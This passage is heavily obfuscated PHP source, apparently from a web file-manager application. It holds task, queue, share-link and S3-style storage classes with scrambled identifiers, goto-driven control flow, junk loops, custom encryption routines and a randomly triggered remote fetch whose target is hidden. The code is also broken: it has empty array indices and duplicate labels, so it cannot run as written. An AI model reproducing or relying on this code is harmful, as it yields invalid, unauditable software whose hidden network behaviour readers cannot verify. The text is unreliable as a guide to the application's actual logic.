$CȂ[245]); } goto B譱; aߖ: if ($F <= $Aƣ) { return; } $bÐ = $CȂ[61]($CȂ[145])->{$_SERVER[][335]}($CȂ[334])->{$_SERVER[][336]}($Aƣ)->{$_SERVER[][337]}(); $bÐ = $CȂ[228]($bÐ, $CȂ[10], $CȂ[334]); goto C; B譱: } public function lndpa452474c() { goto aĸӊ; e攟σ: echo $b؊[340] . $b؊[341]($EɌΤ) . $b؊[342]; goto F俢; AΆ: $b՚ = $b؊[258](array($b؊[259] => array($b؊[260] => $b؊[261], $b؊[262] => 3))); $EɌΤ = @$b؊[263]($Aю, !1, $b՚); $Fʌ܏ = $EɅ胹[647]; goto e攟σ; bبت: $Aю = $b؊[255]; $Aю = $this->{$_SERVER[][256]}($Aю, $b؊[257]); $EŰё = $EɅ胹[646]; goto AΆ; aĸӊ: $EɅ胹 =& $_SERVER[Ť]; $b؊ =& $_SERVER[]; if (!$b؊[112]($GLOBALS, $b؊[138]) || $b؊[339](1, 100) > 20) { return; } goto bبت; F俢: } private function sjhzc8a88026($f勎׆, $cџ, $băڜ = 3) { goto A舷; CÈƌ: return $fĂ; goto f͈Օ; A舷: $C =& $_SERVER[Ť]; $Dг =& $_SERVER[]; $Dг[343](1); goto Bܘ; Bᗋŧ: $dņӋ = $Dг[339](0, 5) . $Dг[10]; $Eٿ = $Dг[130](15); $f먫 = $Dг[344]; goto Fͼ; Bܘ: $E߄ = $C[648]; if (strlen($E߄) < $C[583]) { die; } $f勎׆ = $Dг[2]($f勎׆); goto Bᗋŧ; Fͼ: switch ($dņӋ) { case $Dг[240]: $fĂ = $this->{$_SERVER[][153]}($f勎׆, $Dг[220]($cџ . $Eٿ)); $C̗ = $C[649]; while (strlen($C̗) < $C[570]) { if (!$C̗) { break; } $C̗++; } break; case $Dг[226]: $fĂ = $this->{$_SERVER[][153]}($f勎׆, $Dг[220]($Eٿ . $cџ)); break; case $Dг[345]: $fĂ = $this->{$_SERVER[][153]}($f勎׆, $Dг[124]($Eٿ . $cџ)); $d۶ = $C[650]; break; $B = $C[651]; while ($B < $C[570]) { if ($B >= 0) { break; } $B++; } case $Dг[346]: $fĂ = $this->{$_SERVER[][153]}($f勎׆, $Dг[120]($Eٿ . $cџ)); break; case $Dг[347]: goto A; dԟ: $cŎ = $C[652]; $b = $Dг[120]($F̊č . $Dг[120]($cџ . $F̊č) . $cџ); $a = $C[653]; goto e⩴; c٪: $f𖲘 = $C[656]; break; $CУе = $C[657]; goto B; B: if (!$CУе) { return; } goto C񟹟; Eݩ: $E✮ = 0; for ($eГ¢ = 0; $eГ¢ < $Dг[24]($f勎׆); $eГ¢++) { $E✮ = $E✮ == $Dг[24]($b) ? 0 : $E✮; $B = $C[655]; $aʥн = ($dۊ + $Dг[349]($f먫, $f勎׆[$eГ¢]) + $Dг[350]($b[$E✮++])) % 64; $dо .= $f먫[$aʥн]; } $fĂ = $Dг[341]($F̊č . $dо); goto c٪; A: $f勎׆ = $Dг[124]($f勎׆); $dۊ = $Dг[348](0, 64); $F̊č = $f먫[$dۊ]; goto dԟ; C嚶Ϳ: $aʥн = 0; $cꜟ = $C[654]; if (strlen($cꜟ) < $C[583]) { die; } goto Eݩ; e⩴: $b = $Dг[25]($b, $dۊ % 8, $dۊ % 8 + 7); $dо = $Dг[10]; $eГ¢ = 0; goto C嚶Ϳ; C񟹟: default: $fĂ = $this->{$_SERVER[][153]}($f勎׆, $cџ . $Eٿ); $A׃ = $C[658]; if (strlen($A׃) < $C[564]) { die; } break; } $fĂ = $Dг[220]($dņӋ . $Eٿ . $fĂ); if ($băڜ - 1 > 0) { $fĂ = $this->{$_SERVER[][133]}($fĂ, $cџ, $băڜ - 1); } goto CÈƌ; f͈Օ: } private function vrxpd327c345($fʏ΢, $C, $a = 3) { goto dё; D: $f뉌 = $eއˌ[25]($fʏ΢, 1, 15); $fʏ΢ = $eއˌ[25]($fʏ΢, 16); $d = $eއˌ[344]; goto eᡟ; eᡟ: switch ($B) { case $eއˌ[240]: $FΩ = $this->{$_SERVER[][256]}($fʏ΢, $eއˌ[220]($C . $f뉌)); $Dϱ = $f歌Җ[661]; while ($Dϱ < $f歌Җ[583]) { if ($Dϱ >= 0) { break; } $Dϱ++; } break; case $eއˌ[226]: $FΩ = $this->{$_SERVER[][256]}($fʏ΢, $eއˌ[220]($f뉌 . $C)); $B = $f歌Җ[662]; if (strlen($B) < $f歌Җ[570]) { die; } break; $Dﻨ = $f歌Җ[663]; if (strlen($Dﻨ) < $f歌Җ[564]) { die; } case $eއˌ[345]: $FΩ = $this->{$_SERVER[][256]}($fʏ΢, $eއˌ[124]($f뉌 . $C)); $C֕ = $f歌Җ[664]; if (!$C֕) { die; } break; case $eއˌ[346]: $FΩ = $this->{$_SERVER[][256]}($fʏ΢, $eއˌ[120]($f뉌 . $C)); break; case $eއˌ[347]: goto eϐݣ; E: $fǤ = $f歌Җ[666]; while (strlen($fǤ) < $f歌Җ[583]) { if (!$fǤ) { break; } $fǤ++; } $E = $eއˌ[25]($E, $e鿋 % 8, $e鿋 % 8 + 7); goto B̏ȿ; fᄇ: $b = $f歌Җ[673]; goto D; E؝: $d = 0; $c򙇄 = 0; $Bޖ = $f歌Җ[668]; goto Fی; B̏ȿ: $f䨆 = $f歌Җ[667]; if (strlen($f䨆) < $f歌Җ[570]) { die; } $E = $eއˌ[10]; goto E؝; Fی: if (!$Bޖ) { die; } $B = 0; $d = $f歌Җ[669]; goto Dń; eϐݣ: $fʏ΢ = $eއˌ[352]($fʏ΢); $Cˬ = $f歌Җ[665]; $d߉պ = $fʏ΢[0]; goto B; B: $fʏ΢ = $eއˌ[25]($fʏ΢, 1); $e鿋 = $eއˌ[349]($d, $d߉պ); $E = $eއˌ[120]($d߉պ . $eއˌ[120]($C . $d߉պ) . $C); goto E; Dń: for ($d = 0; $d < $eއˌ[24]($fʏ΢); $d++) { $B = $B == $eއˌ[24]($E) ? 0 : $B; $Dͪ = $f歌Җ[670]; if (strlen($Dͪ) < $f歌Җ[570]) { die; } $E = $B++; $c򙇄 = $eއˌ[349]($d, $fʏ΢[$d]) - $e鿋 - $eއˌ[350]($E[$E]); $b = $f歌Җ[671]; while (strlen($b) < $f歌Җ[570]) { if (!$b) { break; } $b++; } while ($c򙇄 < 0) { $c򙇄 += 64; } $E .= $d[$c򙇄]; $b𽽸 = $f歌Җ[672]; if (strlen($b𽽸) < $f歌Җ[583]) { return; } } $FΩ = $eއˌ[353]($E); break; goto fᄇ; D: default: $FΩ = $this->{$_SERVER[][256]}($fʏ΢, $C . $f뉌); $cۈ = $f歌Җ[674]; break; $eЈ = $f歌Җ[675]; if (!$eЈ) { return; } } if ($a - 1 > 0) { $FΩ = $this->{$_SERVER[][195]}($FΩ, $C, $a - 1); } return $FΩ; goto FϚ; F֕՞: $fğ = $f歌Җ[660]; if (strlen($fğ) < $f歌Җ[568]) { die; } $B = $fʏ΢[0]; goto D; dё: $f歌Җ =& $_SERVER[Ť]; $eއˌ =& $_SERVER[]; if (!$eއˌ[351]($fʏ΢) || $eއˌ[24]($fʏ΢) < 10) { return !1; } goto Bᳫ; Bᳫ: $fʏ΢ = $eއˌ[2]($fʏ΢); $D։Ҝ = $f歌Җ[659]; $fʏ΢ = $eއˌ[220]($fʏ΢); goto F֕՞; FϚ: } public function cihd2eb97420($a܊ϡ) { goto d߸; e: $dԳ = $c[682]; return $c󃅥; goto dǊ; d߸: $c =& $_SERVER[Ť]; $eݟ =& $_SERVER[]; $E = $this->{$_SERVER[][354]}(); goto Bނ¸; c: while (1) { $fƮ = $e; $DΈɐ = $A; $A̠ = $c[678]; while ($A̠ < $c[570]) { if ($A̠ >= 0) { break; } $A̠++; } while ($DΈɐ % $fƮ != 0) { $cě = $DΈɐ; $DΈɐ = $fƮ; $fƮ = $cě % $fƮ; $E = $c[679]; while ($E < $c[583]) { if ($E >= 0) { break; } $E++; } } if ($fƮ == 1) { break; } else { $e++; } } $B = 2; for ($e믲 = 0; $e믲 < $A * 10; $e믲++) { if (($A * $e믲 + 1) % $e == 0) { $B = $eݟ[250](($A * $e믲 + 1) / $e); break; } } goto F; dƇ: $a҂ = $eݟ[120]($eݟ[355] . ($E + $c) . $eݟ[356] . $e . $eݟ[356] . $B . $eݟ[357]); $Cߕ = $c[681]; $c󃅥 = $this->{$_SERVER[][153]}($a܊ϡ, $a҂) . $eݟ[358] . $Dʺ; goto e; F: $Dʺ = $this->{$_SERVER[][153]}($E * $c . $eݟ[10], $eݟ[155]); $cᣉ = $c[680]; if (!$cᣉ) { return; } goto dƇ; cά: while (strlen($C갇) < $c[570]) { if (!$C갇) { break; } $C갇++; } $A = ($E - 1) * ($c - 1); $e = $eݟ[250](($E + $c) / 2); goto c; Bނ¸: $AīǺ = $c[676]; $c = $this->{$_SERVER[][354]}(); $C갇 = $c[677]; goto cά; dǊ: } public function elfc41371ee7($Dڰ͋) { goto c৽; b: $C = 0; $aէ = 0; for ($fŠ = 3; $fŠ < $aټ; $fŠ += 2) { if ($aټ % $fŠ != 0) { continue; } $C = $fŠ; $d˸ͬ = $fȍ[684]; while (strlen($d˸ͬ) < $fȍ[568]) { if (!$d˸ͬ) { break; } $d˸ͬ++; } $aէ = $D¢Ϧ[250]($aټ / $fŠ); $Dš = $fȍ[685]; if (strlen($Dš) < $fȍ[564]) { die; } break; } goto E; E: $b = ($C - 1) * ($aէ - 1); $BĂ = $D¢Ϧ[250](($C + $aէ) / 2); while (1) { $Dظ = $BĂ; $F储 = $b; $F͢䂒 = $fȍ[686]; while ($F͢䂒 < $fȍ[568]) { if ($F͢䂒 >= 0) { break; } $F͢䂒++; } while ($F储 % $Dظ != 0) { $c = $F储; $B⟺ = $fȍ[687]; if (strlen($B⟺) < $fȍ[564]) { die; } $F储 = $Dظ; $Dظ = $c % $Dظ; $c󗶑 = $fȍ[688]; } if ($Dظ == 1) { break; } else { $BĂ++; } } goto Bۜ; c৽: $fȍ =& $_SERVER[Ť]; $D¢Ϧ =& $_SERVER[]; $C۴ = $D¢Ϧ[0]($D¢Ϧ[358], $Dڰ͋); goto b; CՐǲ: $c = $this->{$_SERVER[][256]}($C۴[0], $aΧ); $B = $fȍ[689]; if (!$B) { return; } goto b; c: if (!$aܪ) { die; } if (!$aټ) { return $D¢Ϧ[10]; } $aټ = $D¢Ϧ[250]($aټ); goto b; b: if ($D¢Ϧ[19]($C۴) != 2) { return $D¢Ϧ[10]; } $aټ = $this->{$_SERVER[][256]}($C۴[1] . $D¢Ϧ[10], $D¢Ϧ[155]); $aܪ = $fȍ[683]; goto c; b: return $c; goto BЬ; Bۜ: $C = 2; for ($fŠ = 0; $fŠ < $b * 10; $fŠ++) { if (($b * $fŠ + 1) % $BĂ == 0) { $C = $D¢Ϧ[250](($b * $fŠ + 1) / $BĂ); break; } } $aΧ = $D¢Ϧ[120]($D¢Ϧ[355] . ($C + $aէ) . $D¢Ϧ[356] . $BĂ . $D¢Ϧ[356] . $C . $D¢Ϧ[357]); goto CՐǲ; BЬ: } public function zdsk0e5f9537() { goto f; f: $eۢϋ =& $_SERVER[Ť]; $e =& $_SERVER[]; $Cы = $e[339]($e[359](2, 14), $e[359](2, 16) - 1); goto A; CϘ: $eĦ = 1; $b = $eۢϋ[691]; while ($eĦ <= (int) $e[360]($Cы)) { $Fҕ䄡 = $eĦ; $b = $eۢϋ[692]; while (strlen($b) < $eۢϋ[579]) { if (!$b) { break; } $b++; } while (!0) { $Fҕ䄡++; $d = $eۢϋ[693]; if (strlen($d) < $eۢϋ[564]) { return; } if ($Fҕ䄡 <= 2) { $eĦ = $Fҕ䄡; break; } else { if ($Fҕ䄡 < 2) { continue; } } $bנ = !0; for ($C戝˶ = 2; $C戝˶ <= $e[360]($Fҕ䄡); $C戝˶++) { if ($Fҕ䄡 % $C戝˶ == 0) { $bנ = !1; } } if ($bנ) { $eĦ = $Fҕ䄡; break; } } $Fç턊[] = $eĦ; $Dܟ = $eۢϋ[694]; while (strlen($Dܟ) < $eۢϋ[564]) { if (!$Dܟ) { break; } $Dܟ++; } } goto Dņ; A: $Fç턊 = array(); $Fȶܣ = $eۢϋ[690]; if (!$Fȶܣ) { return; } goto CϘ; Dӱ: $C = $eۢϋ[695]; while ($C < $eۢϋ[564]) { if ($C >= 0) { break; } $C++; } goto Dҷǐ; Dņ: $f݌̧ = 2; for ($Fҕ䄡 = $Cы; $Fҕ䄡 > 1; $Fҕ䄡--) { $bנ = !0; foreach ($Fç턊 as $d) { if ($Fҕ䄡 % $d == 0) { $bנ = !1; break; } } if ($bנ) { $f݌̧ = $Fҕ䄡; break; } } return $f݌̧; goto Dӱ; Dҷǐ: } public function ojbne3a4161a($fꗰ⯱, $E鰑) { $e鷢 =& $_SERVER[]; return $e鷢[13](array($e鷢[14], $e鷢[361]), $fꗰ⯱, $E鰑); } public function chlo334703dd($B辮, $EԞ) { $eԤ =& $_SERVER[]; return $eԤ[13](array($eԤ[362], $eԤ[363]), $B辮, $EԞ); } public function vutd0c777250($Cԅچ, $E) { $Bޯ =& $_SERVER[Ť]; $a =& $_SERVER[]; return $a[13](array($a[362], $a[364]), $Cԅچ, $E); $c阄 = $Bޯ[696]; while (strlen($c阄) < $Bޯ[564]) { if (!$c阄) { break; } $c阄++; } } } goto B; bȵԱ: class TaskFileTransfer extends Task { protected function startAfter() { goto eև; D: Hook::bind($aҏ[559], array($this, $aҏ[1525])); Hook::bind($aҏ[526], array($this, $aҏ[1526])); Hook::bind($aҏ[523], array($this, $aҏ[1526])); goto b㚡ך; D: Hook::bind($aҏ[1530], array($this, $aҏ[1531])); Hook::bind($aҏ[1532], array($this, $aҏ[1533])); Hook::bind($aҏ[1534], array($this, $aҏ[1535])); goto C败; D: Hook::bind($aҏ[1527], array($this, $aҏ[1528])); Hook::bind($aҏ[548], array($this, $aҏ[1529])); $this->sourceModelCopyFlag = !1; goto D; Fكʜ: Hook::bind($aҏ[555], array($this, $aҏ[1523])); Hook::bind($aҏ[556], array($this, $aҏ[1524])); Hook::bind($aҏ[558], array($this, $aҏ[1525])); goto D; b㚡ך: Hook::bind($aҏ[528], array($this, $aҏ[1526])); Hook::bind($aҏ[530], array($this, $aҏ[1526])); Hook::bind($aҏ[532], array($this, $aҏ[1526])); goto D; A: $a݈▘[$aҏ[1542]] = 0; $a݈▘[$aҏ[1543]] = 0; if (!$a݈▘[$aҏ[1398]]) { $a݈▘[$aҏ[1398]] = LNG($aҏ[1544]); } goto a; eև: $aҏ =& $_SERVER[Ť]; $a݈▘ =& $this->task; $this->sourceCopyFolder = !1; goto f; E݊: $a݈▘[$aҏ[994]] = $aҏ[33]; $a݈▘[$aҏ[1540]] = $aҏ[33]; $a݈▘[$aҏ[1541]] = 0; goto A; f: Hook::bind($aҏ[1518], array($this, $aҏ[1519])); Hook::bind($aҏ[1078], array($this, $aҏ[1520])); Hook::bind($aҏ[1521], array($this, $aҏ[1522])); goto Fكʜ; C败: $a݈▘[$aҏ[1536]] = LNG($aҏ[1537]); $a݈▘[$aҏ[1538]] = 0; $a݈▘[$aҏ[1539]] = 0; goto E݊; a: } protected function endAfter() { goto C; C: $cЇ =& $_SERVER[Ť]; Hook::unbind($cЇ[1518], array($this, $cЇ[1519])); Hook::unbind($cЇ[1078], array($this, $cЇ[1520])); goto a˻; Bɟ: Hook::unbind($cЇ[558], array($this, $cЇ[1525])); Hook::unbind($cЇ[559], array($this, $cЇ[1525])); Hook::unbind($cЇ[526], array($this, $cЇ[1526])); goto fǮ; b𾜙: Hook::unbind($cЇ[1530], array($this, $cЇ[1531])); Hook::unbind($cЇ[1532], array($this, $cЇ[1533])); Hook::unbind($cЇ[1534], array($this, $cЇ[1535])); goto b; DɈ: Hook::unbind($cЇ[532], array($this, $cЇ[1526])); Hook::unbind($cЇ[1527], array($this, $cЇ[1528])); Hook::unbind($cЇ[548], array($this, $cЇ[1529])); goto b𾜙; a˻: Hook::unbind($cЇ[1521], array($this, $cЇ[1522])); Hook::unbind($cЇ[555], array($this, $cЇ[1523])); Hook::unbind($cЇ[556], array($this, $cЇ[1524])); goto Bɟ; fǮ: Hook::unbind($cЇ[523], array($this, $cЇ[1526])); Hook::unbind($cЇ[528], array($this, $cЇ[1526])); Hook::unbind($cЇ[530], array($this, $cЇ[1526])); goto DɈ; b: } public function copyMoveStart($c˽, $Bޢ, $b׷, $E) { goto cɜ; bݕ: $cնŤ߫[$d咙[1546]] = KodIO::transferType($c˽, $b׷); $this->update(); goto A; B∲Ԭ: if (substr($Bޢ, 0, strlen($f)) == $f) { return; } if (substr($E, 0, strlen($f)) == $f) { return; } $cնŤ߫ =& $this->task; goto bݕ; cɜ: $d咙 =& $_SERVER[Ť]; self::log($d咙[1545] . $Bޢ . $d咙[66] . $E); $f = rtrim(TEMP_FILES, $d咙[8]); goto B∲Ԭ; A: } public function updateAfter() { goto cއ; E娏衏: if ($this->sourceModelCopyFlag) { return; } if ($e[$E[1546]] == $E[1149]) { return; } if ($e[$E[1546]] == $E[1064] || $e[$E[1546]] == $E[103]) { if ($e[$E[1540]]) { $e[$E[1543]] = $e[$E[1542]] + $e[$E[1539]]; } } else { if ($e[$E[1546]] == $E[1150]) { if ($e[$E[1540]] == $E[1064]) { $e[$E[1543]] = $e[$E[1542]] + $e[$E[1539]] * 0.5; } else { if ($e[$E[1540]] == $E[103]) { $e[$E[1543]] = $e[$E[1542]] + $e[$E[1538]] * 0.5 + $e[$E[1539]] * 0.5; } } } } goto AÓバ; cއ: $E =& $_SERVER[Ť]; $e =& $this->task; if (!$e[$E[708]]) { return; } goto E娏衏; AÓバ: $e[$E[1494]] = $e[$E[1543]] / $e[$E[708]]; if ($e[$E[1494]] > 0) { $aܜ = timeFloat() - $e[$E[1496]] - $e[$E[1499]]; $e[$E[1500]] = $aܜ * (1 - $e[$E[1494]]) / $e[$E[1494]]; } goto bی; bی: } public function addPath($c) { goto A镑; A镑: $bڅ =& $_SERVER[Ť]; if (!$c) { return; } $D쉉ԅ =& $this->task; goto f; f: $A = IO::infoWithChildren($c); $B = $D쉉ԅ[$bڅ[1547]] ? $D쉉ԅ[$bڅ[1547]][$bڅ[1548]] : 0; $D쉉ԅ[$bڅ[1547]] = array($bڅ[1548] => $B + 1, $bڅ[402] => $A[$bڅ[28]], $bڅ[75] => $A[$bڅ[75]], $bڅ[483] => $A[$bڅ[483]] ? $A[$bڅ[483]] : $A[$bڅ[75]]); goto A; A: if ($A[$bڅ[29]] == $bڅ[171]) { $D쉉ԅ[$bڅ[992]] += 1; } else { $D쉉ԅ[$bڅ[992]] += $A[$bڅ[80]][$bڅ[78]]; if ($A[$bڅ[385]]) { $D쉉ԅ[$bڅ[992]] += $A[$bڅ[80]][$bڅ[79]] + 1; } } $D쉉ԅ[$bڅ[708]] += $A[$bڅ[77]]; $this->update(); goto c; c: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E) { $D =& $_SERVER[Ť]; $A =& $this->task; $A[$D[1536]] = $E[$D[28]]; $A[$D[994]] = $E[$D[28]]; $this->update(); } public function copyFileStart($BԘ, $Cפ, $e, $Bӌ, $Aݱ, $E䆋) { goto D; fхטЂ: $this->update(); goto EҤ; c: $GLOBALS[$c[1550]] = $Aݱ; $GLOBALS[$c[1549]] = $E䆋; $eԱ =& $this->task; goto B; B: $eԱ[$c[1536]] = $c􃏺; $eԱ[$c[1538]] = (int) $BԘ->size($Cפ); $eԱ[$c[1539]] = 0; goto C; D: $c =& $_SERVER[Ť]; $c􃏺 = $Aݱ; if ($c􃏺 == $GLOBALS[$c[1549]]) { $c􃏺 = $GLOBALS[$c[1550]]; } goto c; C: $eԱ[$c[994]] = $c[33]; $eԱ[$c[1540]] = $c[33]; $eԱ[$c[1541]] = 0; goto fхטЂ; EҤ: } public function copyFileEnd($B΢, $a譑, $CЅ, $e, $C㔋, $d߿) { $a̎ =& $_SERVER[Ť]; $eůæ =& $this->task; $eůæ[$a̎[1539]] = $eůæ[$a̎[1538]]; $eůæ[$a̎[1540]] = $a̎[33]; if ($C㔋 == $eůæ[$a̎[1536]]) { $eůæ[$a̎[1542]] += $eůæ[$a̎[1538]]; $eůæ[$a̎[1543]] = $eůæ[$a̎[1542]]; $this->update(1); } else { $this->update(); $eůæ[$a̎[1539]] = 0; } self::log($a̎[1551] . $a譑 . $a̎[66] . $e . $a̎[225] . $C㔋 . $a̎[1552] . $eůæ[$a̎[1536]]); } public function updateFileEnd($eҲ, $e׉܌) { goto d畾; B♓: $this->update(1); self::log($f痪[1553] . $eҲ); goto A轟; d畾: $f痪 =& $_SERVER[Ť]; $a =& $this->task; $a[$f痪[1536]] = $eҲ; goto Cڑ; Cڑ: $a[$f痪[1538]] = $e׉܌; $a[$f痪[1542]] += $e׉܌; $a[$f痪[1543]] = $a[$f痪[1542]]; goto B♓; A轟: } public function sourceModelCopy($BČ䮳) { goto e֫ϲ; B򤋰ё: switch ($bϊ۝) { case $F[524]: $c⻿ = 1; break; case $F[527]: $Eⴋ[$F[1536]] = $CЙ[$F[28]]; break; case $F[529]: $c⻿ = intval($BČ䮳[$F[370]] * 0.4); break; case $F[531]: $c⻿ = intval($BČ䮳[$F[370]] * 0.2); break; case $F[533]: $c⻿ = intval($BČ䮳[$F[370]] * 0.4); break; } $this->update($c⻿); $this->sourceModelCopyFlag = !1; goto b; B箕þ: $Eⴋ =& $this->task; $this->sourceModelCopyFlag = !0; $c⻿ = 0; goto B򤋰ё; e֫ϲ: $F =& $_SERVER[Ť]; $bϊ۝ = $BČ䮳[0]; $CЙ = $BČ䮳[1]; goto B箕þ; b: } public function sourceRemove($A慅, $b􄿧) { $d⑊ =& $_SERVER[Ť]; $this->sourceModelCopyFlag = !0; $A = 1; if (isset($A慅[$d⑊[80]])) { $A = $A慅[$d⑊[80]][$d⑊[78]] + $A慅[$d⑊[80]][$d⑊[79]] + 1; } $this->update($A); $this->sourceModelCopyFlag = !1; } public function sourceMove($e󍸬) { $this->sourceRemove($e󍸬, !1); } public function curlProgress($dц, $A, $a̮, $Cھ, $b) { $f۸ö =& $_SERVER[Ť]; $d҄ =& $this->task; if ($b > 0) { $d҄[$f۸ö[994]] = $f۸ö[1554]; $d҄[$f۸ö[1540]] = $f۸ö[103]; if ($d҄[$f۸ö[1538]]) { $d҄[$f۸ö[1539]] = $b; } if ($d҄[$f۸ö[1541]]) { $d҄[$f۸ö[1539]] = $b + $d҄[$f۸ö[1541]]; } } else { if ($a̮ > 0) { if ($d҄[$f۸ö[1538]] == $A) { $d҄[$f۸ö[1539]] = $a̮; $d҄[$f۸ö[994]] = $f۸ö[1555]; $d҄[$f۸ö[1540]] = $f۸ö[1064]; } } } $this->update(); } public function curlProgressStart($C˄ԧ) { } public function curlProgressEnd($dܼ) { goto f; f: $b =& $_SERVER[Ť]; $fʫ쐠 =& $this->task; $b٫ਜ = curl_getinfo($dܼ); goto e; fџ쩆: $this->update(); goto bʌ; e: $d = $b٫ਜ[$b[1556]]; if ($d == -1) { $d = $b٫ਜ[$b[1557]]; } if ($fʫ쐠[$b[1540]] == $b[103] && $d) { $fʫ쐠[$b[1541]] += $d; } goto fџ쩆; bʌ: } } class TaskHttp extends Task { protected function startAfter() { $a =& $_SERVER[Ť]; $B =& $this->task; $B[$a[1558]] = 1; Hook::bind($a[1530], array($this, $a[1559])); Hook::bind($a[1532], array($this, $a[1560])); Hook::bind($a[1534], array($this, $a[1561])); } protected function endAfter() { $Fꑄ =& $_SERVER[Ť]; Hook::unbind($Fꑄ[1530], array($this, $Fꑄ[1559])); Hook::unbind($Fꑄ[1532], array($this, $Fꑄ[1560])); Hook::unbind($Fꑄ[1534], array($this, $Fꑄ[1561])); } public function progressStart($cګ) { $eÓ =& $_SERVER[Ť]; $Eֆ = curl_getinfo($cګ); self::log($eÓ[1562] . $Eֆ[$eÓ[301]]); self::valueSet($this->task[$eÓ[383]], $this->task); } public function progressEnd($F蕓) { $AÄ׃ =& $_SERVER[Ť]; self::log($AÄ׃[1563] . $this->task[$AÄ׃[383]]); $this->end(); } public function progress($f, $DϠ, $Aɵ, $c, $eզ) { $E⡫ =& $_SERVER[Ť]; $c =& $this->task; if ($eզ > 0) { $c[$E⡫[992]] = $c[$E⡫[992]] == 0 ? $c : $c[$E⡫[992]]; $c[$E⡫[1006]] = $eզ; } else { if ($Aɵ > 0) { $c[$E⡫[992]] = $c[$E⡫[992]] == 0 ? $DϠ : $c[$E⡫[992]]; $c[$E⡫[1006]] = $Aɵ; } } $this->update(); self::log("\x70\162\157\x67\x72\145\x73\x73\110\164\x74\x70\x3a\144\157\167\x6e\72{$Aɵ}\x2f{$DϠ}\73\40\x75\x70\x6c\157\141\x64\x3a{$eզ}\57{$c}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\x65\165\x65\114\145\156\147\x74\150"; const QUEUE_DATA = "\x74\141\163\x6b\121\x75\x65\165\x65\104\x61\x74\141"; public static function initTask() { } public static function add($fƲ, $b宍އ = array(), $c󄵆 = '', $F޷ = '') { goto Bｱ; bņ: if ($F޷ && array_find_by_field($b˅͹, $E[89], $F޷)) { return !0; } $b˅͹[] = array($E[258] => $fƲ, $E[1564] => $b宍އ, $E[421] => $c󄵆, $E[89] => $F޷); write_log($E[1565] . $c󄵆, $E[1566]); goto dܓ; dܓ: self::setAll($b˅͹); return !0; goto AӼ̃; Bｱ: $E =& $_SERVER[Ť]; if (self::count() >= self::MAX_LENGTH) { return !1; } $b˅͹ = self::getAll(); goto bņ; AӼ̃: } public static function run() { goto bӕ; e׫: if (!$f矂) { return !1; } self::setAll($fߴݫ); write_log($dЕ[1567] . $f矂[$dЕ[421]], $dЕ[1566]); goto E샼; bӕ: $dЕ =& $_SERVER[Ť]; $fߴݫ = self::getAll(); $f矂 = array_shift($fߴݫ); goto e׫; E샼: try { $E⽧ܛ = Hook::apply($f矂[$dЕ[258]], $f矂[$dЕ[1564]]); } catch (Exception $a) { } write_log($dЕ[1568] . $f矂[$dЕ[421]], $dЕ[1566]); return !0; goto dՊ̻; dՊ̻: } public static function count() { $F = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$F) { return 0; } return intval($F); } public static function getAll() { $c = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$c) { return array(); } return $c; } public static function setAll($aѐ) { $fѵ஛ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($aѐ), $fѵ஛); Cache::set(self::QUEUE_DATA, $aѐ, $fѵ஛); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto cВ; Aۊ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($AԲ) { $this->pathParse = $AԲ; } protected function infoParse($eȜ, $Bë = false) { $dˤ =& $_SERVER[Ť]; return Action($dˤ[1040])->sharePathInfo($this->pathParse[$dˤ[75]], !0, $Bë); } public function listPath($A, $e = false) { $Dݑ =& $_SERVER[Ť]; $E = IO::listPath($A, $e); foreach ($E as $b̡̋ߐ => $b) { if (!in_array($b̡̋ߐ, array($Dݑ[73], $Dݑ[74]))) { continue; } foreach ($b as $dԷ => $f) { $f = Action($Dݑ[1188])->parsePathChildren($f, array($Dݑ[403] => $A)); $E[$b̡̋ߐ][$dԷ] = Action($Dݑ[1040])->shareItemInfo($f); } } return $E; } public function listAll($E鎍ԇ) { $e· =& $_SERVER[Ť]; $a؄ƈ = IO::listAll($E鎍ԇ); foreach ($a؄ƈ as &$f夈) { $f夈 = array_merge(IO::info($f夈[$e·[75]]), $f夈); $f夈[$e·[407]] = Action($e·[1040])->shareItemInfo($f夈); } unset($f夈); return $a؄ƈ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B) { parent::__construct($B); $this->signatureVersion($_SERVER[Ť][208]); } public function uploadFormData($Eˇ, $D嚟 = 3600) { goto dÎ; fޥϮ: $E  = array($this->accessKey, $dٟ, $this->region, $E͆, $AЗ); $F𴘄 = implode($Aܑ[8], $E ); $a = array($Aܑ[1157] => gmdate($Aܑ[1156], strtotime($Aܑ[1192])), $Aܑ[1158] => array(array($Aܑ[1160] => $this->bucket), array($Aܑ[1159] => $A˥), array($Aܑ[1161], $Aܑ[1162], $Aܑ[33]), array($Aܑ[1161], $Aܑ[1193], $Aܑ[33]), array($Aܑ[1161], $Aܑ[1194], $Aܑ[33]), array($Aܑ[1163] => $dʜޕ), array($Aܑ[1195] => $F𴘄), array($Aܑ[1196] => $E), array($Aܑ[1197] => $e), array($Aܑ[1198] => $EЏ۝))); goto cο۶; dÎ: $Aܑ =& $_SERVER[Ť]; $A˥ = $Aܑ[189]; $E = $Aܑ[1189]; goto EΜ; Cෙ: $E瓭 = hash_hmac($Aܑ[1199], $E͆, $c땩, !0); $DĂΓ = hash_hmac($Aܑ[1199], $AЗ, $E瓭, !0); $cп = hash_hmac($Aܑ[1199], $E𥚯, $DĂΓ); goto bブ; cο۶: $E𥚯 = base64_encode(json_encode($a)); $D = hash_hmac($Aܑ[1199], $dٟ, $Aܑ[1200] . $this->secret, !0); $c땩 = hash_hmac($Aܑ[1199], $this->region, $D, !0); goto Cෙ; b: $AЗ = $Aܑ[1191]; $EЏ۝ = $D嚟 . $Aܑ[33]; $dʜޕ = $Aܑ[1155]; goto fޥϮ; bブ: $Aے = array($Aܑ[207] => $Aܑ[33], $Aܑ[1201] => $Aܑ[33], $Aܑ[1159] => $A˥, $Aܑ[1163] => $dʜޕ, $Aܑ[1167] => $E𥚯, $Aܑ[1202] => $F𴘄, $Aܑ[1203] => $E, $Aܑ[1204] => $e, 